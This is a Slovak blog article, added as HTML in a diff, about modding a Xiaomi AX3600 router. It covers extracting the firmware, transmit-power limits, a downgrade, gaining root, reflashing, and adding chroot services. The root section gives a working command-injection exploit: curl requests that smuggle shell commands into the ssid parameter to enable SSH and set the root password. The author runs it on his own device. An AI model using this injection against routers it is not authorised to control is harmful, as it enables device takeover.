@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Používanie WiFi routra Xiaomi AX3600</title>
+	<meta charset="utf-8" />
+	<link href="../../../common/style.css" rel="stylesheet" />
+</head>
+<body>
+<article>
+
+<header>
+	<h1>Používanie WiFi routra Xiaomi AX3600</h1>
+
+	<p>Dnešný článok bude obsahovať malú recenziu routra Xiaomi AX3600 (pst je to sračka, ale nikomu to nehovorte) a pár trikov, ktorými sa z neho môže stať celkom civilizované a použiteľné zariadenie na domácej sieti.</p>
+</header>
+
+<p>Po zmene internetového providera som potreboval aj nový WiFi router, keďže súčasný bol len zapožičaný. Rozhodol som sa pre Xiaomi AX3600. Na prvý pohľad vyzerá ako obrovský výkonný router. Je obrovský, má 7 nastaviteľných antén na masívnej trojuholníkovej základni.</p>
+
+<p>Na papieri vyzerá všetko v poriadku. Poháňaný je 4-jadovým 64-bitovým ARM CPU taktovaným na 1.4 GHz. Doplnený je 512 MB RAM a 256 MB flash. Router nemá vyvedené USB napriek tomu, že chipset pravdepodobne obsahuje USB 3.1 konrolér. Škoda.</p>
+
+<p>Router podporuje štandard WiFi 6 (ax) so šírkou pásma 160 MHz. Maximálna rýchlosť je 2402 Mbps. Z milých funkcií by som ešte spomenul podporu mesh.</p>
+
+<figure>
+	<a href="img/router_na_stole.jpg"><img src="img/router_na_stole.jpg" alt="Xiaomi AX3600" /></a>
+	<figcaption>Obrázok <counter></counter>: Xiaomi AX3600</figcaption>
+</figure>
+
+<h2>Nie všetko, čo sa blyští …</h2>
+
+<p>Vlastný router namiesto prenajatého TP-Linku som chcel kvôli lepšiemu pokrytiu (nechcem v každej miestnosti krabičku, chcem jednú veľkú krabicu na celý veľký dom + záhradu) a vyššej rýchlosti. Aký je teda AX3600? Jedným slovom „Nahovno!“.</p>
+
+<p>Signál je katastrofálne malý a nie som jediný, kto má tento problém. Samozrejme pred kúpou som si prešiel recenzie a nekupoval som mačku vo vreci. O problémoch so signálom som vedel a vedel som aj o tom, že problém je softvérový.</p>
+
+<h2>Na stiahnutie</h2>
+
+<p>Než sa pustím do vysvetľovania, hodím tu odkazy na 2 firmvéry:</p>
+
+<ul>
+	<li><a href="https://cdn.alsgp0.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_all_6510e_3.0.22_INT.bin">Medzinárodný firmvér miwifi_r3600_all_6510e_3.0.22_INT.bin</a></li>
+	<li><a href="https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin">Čínsky firmvér miwifi_r3600_firmware_5da25_1.0.17.bin</a></li>
+</ul>
+
+<h2>Rozbalenie firmvéru</h2>
+
+<p>Na extrakciu firmvéru sa dá použiť nástroj <a href="https://github.com/jrspruitt/ubi_reader">ubi_reader</a> a <code>squashfs-tools</code>. Obrazy sa rozbalia do adresárov <code>international</code> a <code>china</code>.</p>
+
+<pre class="code-bash">
+ubireader_extract_images -o international -w miwifi_r3600_all_6510e_3.0.22_INT.bin
+ubireader_extract_images -o china -w miwifi_r3600_firmware_5da25_1.0.17.bin
+unsquashfs -d international/root international/miwifi_r3600_all_6510e_3.0.22_INT.bin/img-1135711824_vol-ubi_rootfs.ubifs
+unsquashfs -d china/root china/miwifi_r3600_firmware_5da25_1.0.17.bin/img-1696626347_vol-ubi_rootfs.ubifs
+</pre>
+
+<h2>Sila signálu</h2>
+
+<p>Teraz v adresári s extrahovaným medzinárodným firmvérom môžem spustiť príkaz, ktorý vyhľadá nastavenie výkony WiFi.</p>
+
+<pre class="code-bash">
+cd international/root
+grep -rI "txpower" .
+</pre>
+
+<p>Vyhľadávanie nájde súbor <code>/lib/wifi/qcawificfg80211.sh</code>. Dôležitý kód je tu:</p>
+
+<pre class="code-bash">
+if [ "$bdmode" = "24G" ]; then
+	max_power=30
+	wifitool "$ifname" setUnitTestCmd 67 3 16 1 1
+	iwpriv "$ifname" 11ngvhtintop 1
+else
+	max_power=30
+fi
+if [ "$bd_country_code" = "EU" ]; then
+	if [ "$bdmode" = "24G" ]; then
+		max_power=14
+	else
+		if [ "$channel" -ge 100 ]; then
+			max_power=23
+		else
+			max_power=16
+		fi
+	fi
+	if [ $ifname = "wl2" ]; then
+		max_power=13
+	fi
+fi
+</pre>
+
+<p>Ak je kód dosky "EU" (teda európsky trh), potom je výkon 2.4 GHz limitovaný na 14 dBm. 5GHz je limitovaná na 16 dBm.</p>
+
+<p>Mimo EU je teda maximálny výkon pre obe siete limitovaný na 30 dBm. Teraz trocha matematiky:</p>
+
+<p>10<sup>30dBm / 10</sup> = 1000mW</p>
+<p>10<sup>14dBm / 10</sup> = 25mW</p>
+<p>1000mW / 25mW = 40 - maximálny výkon je 1/40 maximálneho výkonu v iných regiónoch</p>
+
+<p>Pre zaujímavosť minimálny výkon mimo EU je 27 dBm = 500 mW - stále 20-násobne vyšší výkon než je maximum pre výkon v EU. Mimochodom ak si niekto chce posťažovať na reguláciu v EU - nie, tak nízke limity tu nemáme. Je to len a len zlá implementácia v Xiaomi.</p>
+
+<h2>Downgrade</h2>
+
+<p>Slabý signál sa dá jednoducho vyriešiť nahraním starého <a href="https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin">čínskeho firmvéru</a>. Stačí ho stiahnuť, ísť do administrácie routra vpravo hore cez užívateľské menu vybrať "System update" a "Update manually".</p>
+
+<figure>
+	<a href="img/downgrade.png"><img src="img/downgrade.png" alt="Downgrade" /></a>
+	<figcaption>Obrázok <counter></counter>: Downgrade</figcaption>
+	<figcaption>Obrázok <counter></counter>: 3 steny medzi routrom a počítačom</figcaption>
+</figure>
+
+<p>Po „aktualizácii“ je ovládanie routra v čínštine. Našťastie niektoré internetové prehliadače majú vstavaný prekladač, takže stačí povoliť  preklad a rozhranie sa stane hneď celkom použiteľným. Upozorňujem na to, že čínsky fimrvér nemá vôbec možnosť zmeniť jazyk.</p>
+
+<p>Ďalším nepríjemným prekvapením je, že router od teraz podporuje len šírku pásma 80 MHz namiesto 160 MHz.</p>
+
+<p>Mnohí používatelia tohto routra ho nechávajú so starým deravým čínskym firvmérom bez podpory 160 MHz pásma. Ja k nim nepatrím, ale k tomu sa dostaneme.</p>
+
+<h2>Exploit pre získanie root prístupu na SSH</h2>
+
+<p>Router má webové rozhranie napísané v Lue a je založené na projekte <a href="https://github.com/openwrt/luci">luci</a> z OpenWrt.</p>
+
+<h3>Binárne lua súbory</h3>
+
+<p>Pre ďalší text to nie je dôležité, ale aktuálna verzia firmvéru nahradila zdrojové kódy <code>luci</code> skompilovaným bytekódom. Aby toho nebolo málo, používajú vlastný lua interpret, ktorý má upravený bytekód. Úprava spočíva v poprehadzovaí operačných kódov, čo by sa dalo nazvať jednoduchou substitučnou šifrou. Rozbiť sa dá jednoducho frekvenčnou analýzou. Okrem toho reťazce sú „šifrované“ jednobajtovým xorom gnenerovaným z dĺžka reťazca pomocou vzorca <code>(l * 13 + 55) &amp; 0xff</code>. Blbé, primitívne ale nech sa páči, je to ich vec.</p>
+
+<p>Keby to niekto chcel rozbiť tak <a href="https://github.com/zh-explorer/mi_lua">tu je jednoduchý skript na konverziu do formátu LuaC</a>. Ak by niekto z toho chcel dostať zdrojáky, potom je dobrým projektom <a href="https://github.com/NyaMisty/unluac_miwifi">unluac_miwifi</a>. Aktuálne v repozitári nie je návod, ako to skompilovať tak pre istotu tu pridávam príkazy pre kompiláciu <code>unluac.jar</code>:</p>
+
+<pre class="code-bash">
+find ./src/ -type f -name "*.java" -exec javac -cp ./src/ -d ./out/ '{}' +
+cd out &amp;&amp; jar cfe ../unluac.jar unluac.Main .
+</pre>
+
+<h3>Získavame roota</h3>
+
+<p>Webové rozhranie beží s právami roota. Postačí teda nájsť zraniteľnosť webového rozhrania, ktorá umožňuje spustiť ľubovoľný kód.</p>
+
+<p>Zdrojové kódy starého webového rozhrania sú pekne v plain texte. Zaujímavý je súbor <code>/usr/lib64/lua/luci/controller/api/misystem.lua</code>, ktorý implementuje Xiaomi API. V ostatných súboroch, ktoré sú prevzaté z OpenWrt neočakávam chyby.</p>
+
+<pre class="code-lua">
+function setConfigIotDev()
+    local XQFunction = require("xiaoqiang.common.XQFunction")
+    local LuciUtil = require("luci.util")
+    local result = {
+        ["code"] = 0
+    }
+
+    local ssid = LuciHttp.formvalue("ssid")
+    local bssid = LuciHttp.formvalue("bssid")
+    local uid = LuciHttp.formvalue("user_id")
+
+    XQLog.log(debug_level, "ssid = "..ssid)
+    XQLog.log(debug_level, "bssid = "..bssid)
+    XQLog.log(debug_level, "uid = "..uid)
+    if XQFunction.isStrNil(ssid)
+        or XQFunction.isStrNil(bssid)
+        or XQFunction.isStrNil(uid) then
+        result.code = 1523
+    end
+    if result.code ~= 0 then
+        result["msg"] = XQErrorUtil.getErrorMessage(result.code)
+    else
+        XQFunction.forkExec("connect -s "..ssid.." -b "..bssid.. " -u "..uid)
+    end
+    LuciHttp.write_json(result)
+end
+</pre>
+
+<p>A jeje, <code>XQFunction.forkExec("connect -s "..ssid.." -b "..bssid.. " -u "..uid)</code> volá priamo shell príkaz, pričom nedochádza k žiadnej validácii parametrov. Stačí niekde do parametra pridať nový riadok (<code>%0A</code>) a kód sa vykoná pod rootom! Mimochodom celý firmvér od Xiaomi je <a href="https://hitcon.org/2020/slides/Exploit%20(Almost)%20All%20Xiaomi%20Routers%20Using%20Logical%20Bugs.pdf">deravý ako ementál</a>.</p>
+
+<p>Takže na získanie roota sa dajú použiť tieto príkazy, pričom hodnota <code>STOK</code> je získaná z URL adresy po prihlásení a <code>PASSWORD</code> je želané heslo pre prístup do SSH:</p>
+
+<pre class="code-bash">
+# nvram set ssh_en=1
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0Anvram%20set%20ssh%5Fen%3D1%0A'
+# nvram commit
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0Anvram%20commit%0A'
+# cp /etc/init.d/dropbear /etc/init.d/dropbear_backup
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0Acp%20%2Fetc%2Finit.d%2Fdropbear%20%2Fetc%2Finit.d%2Fdropbear_backup%0A'
+# sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0Ased%20-i%20'%2Fflg_ssh.*release%2F%20%7B%20%3Aa%3B%20N%3B%20%2Ffi%2F!%20ba%20%7D%3B%2Freturn%200%2Fd'%20%2Fetc%2Finit.d%2Fdropbear%0A'
+# echo -e “&lt;PASSWORD&gt;/n&lt;PASSWORD&gt;” | passwd root
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0Aecho%20-e%20%27&lt;PASSWORD&gt;%5Cn&lt;PASSWORD&gt;%27%20%7C%20passwd%20root%0A'
+# /etc/init.d/dropbear enable
+curl 'http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=gallifrey&amp;user_id=doctor&amp;ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20enable%0A'
+# /etc/init.d/dropbear start
+http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=doctor&amp;user_id=doctor&amp;ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A
+</pre>
+
+<p>Po týchto krokoch je možné prihlásiť sa ako root príkazom <code>ssh root@192.168.31.1</code>.</p>
+
+<figure>
+	<a href="img/ssh.png"><img src="img/ssh.png" alt="SSH" /></a>
+	<figcaption>Obrázok <counter></counter>: SSH</figcaption>
+</figure>
+
+<h2>Upgrade</h2>
+
+<p>Nastal čas na upgrade. Najskôr je potrebné vytvoriť si upravený obraz medzinárodného firmvéru nástrojom <a href="https://github.com/geekman/xqrepack">xqrepack</a>.</p>
+
+<pre class="code-bash">
+ubireader_extract_images -w miwifi_r3600_all_6510e_3.0.22_INT.bin
+cd xqrepack
+# tento patch nefunguje s novým firmvérom, ale stačilo by upraviť lokácie a mal by fungovať
+# ja som na to lenivý
+patches/enable-iot-radio.patch
+fakeroot -- ./repack-squashfs.sh ../ubifs-root/miwifi_r3600_all_6510e_3.0.22_INT.bin/img-1135711824_vol-ubi_rootfs.ubifs
+./ubinize.sh \
+  ../ubifs-root/miwifi_r3600_all_6510e_3.0.22_INT.bin/img-1135711824_vol-kernel.ubifs \
+  ../ubifs-root/miwifi_r3600_all_6510e_3.0.22_INT.bin/img-1135711824_vol-ubi_rootfs.ubifs.new
+</pre>
+
+<p>Výsledkom je <code>r3600-raw-img.bin</code> (RAW obraz bez digitálneho podpisu Xiaomi). Tento obraz sa nedá nahrať do zariadenia pomocou webového rozhrania, ale cez SSH to je možné.</p>
+
+<pre class="code-bash">
+scp -O r3600-raw-img.bin root@192.168.31.1:/tmp/r3600-raw-img.bin
+</pre>
+
+<p>Následnej je potrebné prihlásiť sa cez shell a zistiť rozdelenie partícií:</p>
+
+<pre class="code-bash">
+grep rootfs /proc/mtd
+mtd12: 023c0000 00020000 "rootfs"
+mtd13: 023c0000 00020000 "rootfs_1"
+mtd17: 01857000 0001f000 "ubi_rootfs"
+</pre>
+
+<p>Existujú 2 koreňové partície. Zatiaľ čo jedna sa používa, druhú je možné upgradovať.</p>
+
+<p>Príkaz <code>nvram get flag_boot_rootfs</code> zobrazí číslo aktuálne používanej partície. Číslo <code>0</code> znamená <code>mtd12</code> a <code>1</code> <code>mtd13</code>. Keď je tam napríklad <code>1</code>, je možné zapísať do <code>0</code>, teda <code>/dev/mtd12</code>. Nasleduje flashovanie:</p>
+
+<pre class="code-bash">ubiformat /dev/mtd12 -f /tmp/r3600-raw-img.bin -s 2048 -O 2048</pre>
+
+<p>a reštart:</p>
+
+<pre class="code-bash">
+nvram set flag_ota_reboot=1
+nvram commit
+reboot
+</pre>
+
+<p>Po naštartovaní máme opäť medzinárodný firmvér, ale s plným prístupom roota a s možnosťou nastaviť šírku pásma 160 MHz.</p>
+
+<figure>
+	<a href="img/wifi_settings.png"><img src="img/wifi_settings.png" alt="WiFi nastavenia" /></a>
+	<figcaption>Obrázok <counter></counter>: WiFi nastavenia</figcaption>
+</figure>
+
+<figure>
+	<a href="img/160mhz.jpg"><img src="img/160mhz.jpg" alt="Použitie šírky pásma 160 MHz" /></a>
+	<figcaption>Obrázok <counter></counter>: Použitie šírky pásma 160 MHz</figcaption>
+</figure>
+
+<h2>Nastavenie výkonu a zapnutie AIoT</h2>
+
+<p>Pre nastavenie stačí zapísať nasledujúci kód do <code>/etc/rc.local</code>:</p>
+
+<pre class="code-bash">
+sleep 60
+iwconfig wl0 txpower 25
+iwconfig wl1 txpower 25
+ifconfig wl2 up
+
+exit 0
+</pre>
+
+<p>Maximálny výkon je cez 30 dBm. Prečo nastavujem 25, čo je necelá tretina výkonu?</p>
+
+<p>Väčšina používateľov automaticky bez rozmýšľania nastaví maximálny výkon. To však vedie niekedy k nechceným situáciám. Je síce fajn mať silný signál, ale treba si uvedomiť, že komunikácia musí byť obojstranná a keď notebook vidí dobrý signál, neznamená, že router zachytí slabší signál notebooku.</p>
+
+<p>Pri maximálnom možnom výkone je pravdepodobné, že sa počítač bude snažiť s routrom komunikovať na frekvencii 5 GHz, ktorá má podstatne menší dosah. Výsledkom je, že počítač zobrazuje dobrú silu signálu, ale odosielanie dát funguje na maximálne pár kB/s. Keby počítač prepol na 2.4 GHz, mohol by normále pracovať ďalej, ale to sa neudeje kvôli príliš dobrému signálu.</p>
+
+<p>Preto nastavujem silu signálu podľa maximálneho výkonu wifi v mojom počítači (22 dBm = 158 mW). Malá asymetria je v poriadku, spôsobí to, že sťahovanie bude fungovať o niečo rýchlejšie než odosielanie, ale príliš veľký rozdiel (nad 3 dB) už môže spôsobovať problémy.</p>
+
+<h2>Test rýchlosti</h2>
+
+<p>V nasledujúcich grafoch sú testy rýchlosti a signálu pri rôznej vzdialenosti od WiFi routra.</p>
+
+<p>Testy boli vykonané skriptom <a href="data/perform_test.py">perform_test.py</a>. Grafy boli vygenerované skriptom <a href="data/analyze.py">analyze.py</a>. Surové štatistiky sú dostupné v súbore <a href="data/by_distance.tar.xz">by_distance.tar.xz</a>.</p>
+
+<h3>V miestnosti s routrom</h3>
+
+<figure>
+	<a href="img/tests/low/link_quality.svg"><img src="img/tests/low/link_quality.svg" alt="Kvalita signálu" /></a>
+	<a href="img/tests/low/level.svg"><img src="img/tests/low/level.svg" alt="Úroveň signálu" /></a><br />
+	<a href="img/tests/low/download.svg"><img src="img/tests/low/download.svg" alt="Sťahovanie" /></a>
+	<a href="img/tests/low/upload.svg"><img src="img/tests/low/upload.svg" alt="Odosielanie" /></a>
+	<figcaption>Obrázok <counter></counter>: Štatistiky v miestnosti s routrom</figcaption>
+</figure>
+
+<h3>Vo vedľajšej miestnosti (1 stena medzi routrom)</h3>
+
+<figure>
+	<a href="img/tests/med/link_quality.svg"><img src="img/tests/med/link_quality.svg" alt="Kvalita signálu" /></a>
+	<a href="img/tests/med/level.svg"><img src="img/tests/med/level.svg" alt="Úroveň signálu" /></a><br />
+	<a href="img/tests/med/download.svg"><img src="img/tests/med/download.svg" alt="Sťahovanie" /></a>
+	<a href="img/tests/med/upload.svg"><img src="img/tests/med/upload.svg" alt="Odosielanie" /></a>
+	<figcaption>Obrázok <counter></counter>: jedna stena medzi routrom a počítačom</figcaption>
+</figure>
+
+<h3>Ďaleko (3 steny)</h3>
+
+<p>V tomto prípade už rýchlosť výrazne kolíše. Veľký vplyv má okolité rušenie, ale aj to, či niekto stál v ceste signálu, alebo nechal otvorené dvere. V tomto prípade som chcel demonštrovať prakticky najhoršie podmienky v celom dome. Okrem toho ešte zvyknem pracovať na záhrade, čo je síce výraze ďalej, ale bez prekážok okrem jednej steny.</p>
+
+<figure>
+	<a href="img/tests/high/link_quality.svg"><img src="img/tests/high/link_quality.svg" alt="Kvalita signálu" /></a>
+	<a href="img/tests/high/level.svg"><img src="img/tests/high/level.svg" alt="Úroveň signálu" /></a><br />
+	<a href="img/tests/high/download.svg"><img src="img/tests/high/download.svg" alt="Sťahovanie" /></a>
+	<a href="img/tests/high/upload.svg"><img src="img/tests/high/upload.svg" alt="Odosielanie" /></a>
+	<figcaption>Obrázok <counter></counter>: tri steny medzi routrom a počítačom</figcaption>
+</figure>
+
+<figure>
+	<a href="img/finalne_umiestnenie.jpg"><img src="img/finalne_umiestnenie.jpg" alt="Finálne umiestnenie" /></a>
+	<figcaption>Obrázok <counter></counter>: Finálne umiestnenie</figcaption>
+</figure>
+
+<h2>Inštalácia softvéru a spustenie ďalších služieb</h2>
+
+<p>Firmvér je postavený OpenWrt 18.06. Ak by bol súborový systém pripojený na zapisovanie, bola by inštalácia nového softvéru vecou jediného príkazu - <code>opkg install názov-balíka</code>. Tu je však hlavný súborový systém <code>squashfs</code>, ktorý sa jednoducho na zápis nedá pripojiť. V nasledujúcej časti skúsim vysvetliť svoju modifikáciu, ktorou som obišiel obmedzenia.</p>
+
+<h3>Čo to bude vedieť</h3>
+
+<p>Na svoj router som chcel pridať 2 nové služby. Prvou je <code>iperf3</code> server, čo je nástroj na testovanie rýchlosti pripojenia.</p>
+
+<p>Druhá služba je SSH tunel. Tu by som len v krátkosti napísal, čo a prečo chcem pretunelovať. Mám doma <a href="https://github.com/mireq/esp32-internet-radio/blob/master/components/player/player.c">rádio, ktoré prehráva MP3 stream z internetu</a>. Je to obyčajné ESP32 s pár kB RAM a 3W digitálnym zosilňovačom. Nemyslím tým len D-class zosilňovač, čo je pravdepodobne samo o sebe analógové zariadenie, ale MAX98357A, čo je zosilňovač s digitálnym 32-bitovým 96kHz vstupom. Samotný zosilňovač je malý integrovaný obvod s objemom 0.87 mm<sup>3</sup> (hrana o veľkosti cca 1.4 mm).</p>
+
+<p>
+	<a href="https://www.youtube.com/watch?v=25Xtxvdb6V8" target="_blank"><img src="//img.youtube.com/vi/25Xtxvdb6V8/maxresdefault.jpg" alt="Výmena wifi" /></a>
+	<figcaption>Rádio</figcaption>
+</p>
+
+<p>V čase stavania som nemal k dispozícii rotačný enkóder, takže som napísal ovládanie hlasitosti len cez HTTP protokol (websockety). Ovládať to chcem cez mobil, ale nechcel som písať natívnu aplikáciu, takže som zvolil progresívnu webovú aplikáciu. Čo čert nechcel, žiaden prehliadač neakceptuje spojenie z progresívnej webovej aplikácie cez čisté HTTP. Všade musí byť HTTPS, čo je problematické z dvoch dôvodov: ESP32 má obmedzený výkon / kapacitu pamäte a nie je možné získať certifikát na lokálnu IP adresu. Ovládanie pretu tunelujem pomocou SSH na externý webserver, ktorý má HTTPS a platný certifikát.</p>
+
+<p>Bežná inštalácia OpenWrt používa ako SSH klienta dropbear. Na vytvorenie stabilného tunelu je však potrebný plnohodnotný OpenSSH klient, takže sa bude musieť nainštalovať.</p>
+
+<h3>Plán</h3>
+
+<p>Na začiatku som ukázal nástroj vhodný na modifikáciu firmvéru. Doplniť softvér, zostaviť nový firmvér a naflashovať do routra nie je až taký problém, ale nechcel by som to robiť pri každej zmene konfigurácie. Preto použijem niekoľko trikov, ako obísť súborový systém pripojený na čítanie.</p>
+
+<p>Na začiatku som spomenul, že koreňový adresár je read only. Nie je to však jediná partícia. Existuje tu partícia o veľkosti cca 20 MB pripojená ako <code>/userdisk</code>:</p>
+
+<pre>
+ubi1_0                   20.8M      2.7M     17.1M  14% /userdisk
+</pre>
+
+<p>Zároveň nastavenia v <code>/etc</code> sú pripojené na zápis (mimochodom na tej istej partícii, takže tých 20MB je zdieľaných). Okrem toho disponuje router 512MB RAM, čo je dosť na to, aby mohol obsahovať read-write filesystém v RAM.</p>
+
+<p>Trik sa bude skladať z nasledujúcich krokov vykonaných pri každom štarte:</p>
+
+<ul>
+	<li>vytvorenie chrootu pomocou overlayfs s dátami v <code>tmpfs</code> (pripojený ako <code>/tmp</code>)</li>
+	<li>vytvorenie súborov, ktoré prežije reštart (napríklad na uloženie SSH kľúčov)</li>
+	<li>inštalácia dodatočných služieb</li>
+	<li>spustenie dodatočných služieb</li>
+</ul>
+
+<h3>Spustenie</h3>
+
+<p>Spustenie všetkých krokov som dal do <code>/etc/rc.local</code>. Jednotlivé kroky sú uložené v <code>/usrdisk</code> s príznakom executable (<code>chmod +x súbor</code>). Sú to súbory <code>/userdisk/make_chroot.sh</code>, <code>/userdisk/install_packages.sh</code> a <code>/userdisk/start_chroot.sh</code>.</p>
+
+<p>Prvý príkaz vytvorí chroot a spúšťa sa preto priamo. Zvyšné 2 príkazy by sa mali spustiť už z prostredia chrootu. Celý kód, ktorý je potrebné pridať do <code>rc.local</code> vyzerá takto:</p>
+
+<pre class="code-bash">
+/userdisk/make_chroot.sh
+chroot /tmp/root/ /bin/ash -c "/userdisk/install_packages.sh"
+chroot /tmp/root/ /bin/ash -c "/userdisk/start_chroot.sh"
+</pre>
+
+<h3>Chroot</h3>
+
+<p>Skript <code>make_chroot.sh</code> pre vytvorenie chrootu obsahuje všetky nevyhnutné príkazy, ktoré vytvoria prostredie s možnosťou zapisovať súbory v <code>tmpfs</code>.</p>
+
+<pre class="code-bash">
+#!/bin/ash
+cd /tmp
+# vytvorenie nevyhnutných adresárov
+mkdir root
+mkdir upper
+mkdir work
+# skopírovanie súborov, ktoré prežijú reštart
+cp -R /userdisk/chrootdata/* /tmp/upper/
+# pripojenie hlavného súborového systému
+mount -t overlay overlay  -o lowerdir=/,upperdir=upper,workdir=work root
+# pripojenie /proc, /sys, /dev a /userdisk
+mount -t proc none /tmp/root/proc/
+mount -t sysfs none /tmp/root/sys/
+mount --rbind /dev /tmp/root/dev/
+mount --rbind /userdisk /tmp/root/userdisk/
+</pre>
+
+<p>Po spustení skriptu je možné prepnúť sa do nového prostredia príkazom <code>chroot /tmp/root</code>. Tu už balíčkovací systém bude fungovať. Presvedčiť sa môžme napríklad príkazom <code>opkg update</code>, ale predtým je potrebné vytvoriť adresár, v ktorom <code>opkg</code> vytvára zámok.</p>
+
+<pre>
+# mkdir -p /var/lock
+# opkg update
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/base/Packages.gz
+Updated list of available packages in /var/opkg-lists/openwrt_base
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/base/Packages.sig
+Signature check passed.
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/packages/Packages.gz
+Updated list of available packages in /var/opkg-lists/openwrt_packages
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/packages/Packages.sig
+Signature check passed.
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/routing/Packages.gz
+Updated list of available packages in /var/opkg-lists/openwrt_routing
+Downloading http://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/routing/Packages.sig
+Signature check passed.
+# opkg install htop
+# htop
+</pre>
+
+<figure>
+	<a href="img/htop.png"><img src="img/htop.png" alt="htop" /></a>
+	<figcaption>Obrázok <counter></counter>: htop</figcaption>
+</figure>
+
+<h3>Inštalácia balíkov</h3>
+
+<p>Balíky je možné inštalovať z internetu, čo môže byť niekedy nespoľahlivé (napríklad keď router naštartuje počas výpadku servera, alebo počas výpadku providera, alebo providerom dodávaný hardvér bootuje pomalšie). Preto som sa rozhodol uložiť dodatočné balíky do adresára <code>/userdisk/ipk</code>.</p>
+
+<p>Zoznam balíkov je možné nájsť na mirroroch OpenWrt v adresári <a href="https://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/packages/">packages</a>, alebo <a href="https://downloads.openwrt.org/releases/18.06-SNAPSHOT/packages/aarch64_cortex-a53/base/">base</a>. Ja používam konkrétne tieto balíky:</p>
+
+<pre>
+# ls -lh /userdisk/ipk/
+-rw-r--r--    1 root     root       50.1K Nov  5 22:25 iperf3_3.11-1_aarch64_cortex-a53.ipk
+-rw-r--r--    1 root     root      299.5K Oct 30 16:35 openssh-client_7.7p1-2_aarch64_cortex-a53.ipk
+</pre>
+
+<p>Samotný skript pre inštaláciu <code>/userdisk/install_packages.sh</code> nainštaluje všetky balíky v adresári. Na tomto hardvéri to trvá rádovo desatiny sekundy.</p>
+
+<pre class="code-bash">
+#!/bin/ash
+mkdir -p /var/lock
+cd /userdisk/ipk/
+for file in *.ipk
+do
+	opkg install $file
+done
+</pre>
+
+<h3>Štart dodatočných služieb</h3>
+
+<p>Nakoniec sa spustí súbor <code>/userdisk/start_chroot.sh</code>. Tu sa spúšťajú služby. Ako som na začiatku písal, je tam vytvorenie SSH tunelu kvôli rádiu postavenému na ESP32 a spustenie <code>iperf3</code> servera.</p>
+
+<pre class="code-bash">
+#!/bin/ash
+esp_radio_forward &amp;
+iperf3 -s -D
+</pre>
+
+<p>Problém je, že skript <code>esp_radio_forward</code> neexistuje.</p>
+
+<h3>Dodatočné súbory</h3>
+
+<p>Súbory, ktoré sa skopírujú automaticky pri vytváraní chrootu som umiestnil do <code>/userdisk/chrootdata</code>. Tu som teda umiestnil skript, ktorý sa stará o spustenie tunela a reštart ak z nejakého dôvodu spadne spojenie. Výsledný súbor <code>/userdisk/chrootdata/usr/bin/esp_radio_forward</code> vyzerá takto:</p>
+
+<pre class="code-bash">
+#!/bin/ash
+
+while true
+do
+	ssh -N -R &lt;vzdialený port&gt;:&lt;ip rádia&gt;:80 -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes &lt;používateľ&gt;@&lt;server&gt;
+	sleep 1
+done
+</pre>
+
+<p>Okrem toho je potrebné ešte vytvoriť <code>/userdisk/chrootdata/root/.ssh/known_hosts</code> so povoleným odtlačkom vzdialeného servera a kľúče <code>/userdisk/chrootdata/root/.ssh/id_rsa</code> a <code>/userdisk/chrootdata/root/.ssh/id_rsa.pub</code> pre možnosť pripojenia na server pomocou SSH kľúča bez nutnosti zadávať heslo.</p>
+
+<h2>Záver</h2>
+
+<p>Po pár úpravách som z hrozného routra kúpeného za smiešnu cenu urobil celkom použiteľné zariadenie. Funguje fajn aj ako WiFi router, aj ako malý jednoduchý proxy server.</p>
+
+<p>Rýchlosť pripojenia vo vedľajšej miestnosti je porovnateľná s gigabitovým ethernetom. Dosť dobrý výsledok ak beriem do úvahy, že sa nemusím trápiť s káblom.</p>
+
+<p>V miestnoti s routrom rýchlosť mierne prevažuje gigabit aj keď teoreticky by to mohlo ísť až na 2.4 Gbit/s. Nie som si istý, či je v tomto prípade brzdou CPU, alebo zlý firmvér WiFi karty, alebo niečo úplne iné.</p>
+
+<p>Pri testoch bežne dochádzalo k zamŕzaniu spojenia, čo som musel riešiť v skripte pre testovanie. Samotný test <code>iperf3</code> prebehne síce v poriadku, ale okamžite po teste prestane WiFi karta na niekoľko desiatok sekúnd reagovať. Najskôr som z problému podozrieval router, ale po prehľadaní fór som našiel, že ide o známy problém s kartami Intel.</p>
+
+</article>
+<script src="../../../common/script.js"></script>
+</body>
+</html>
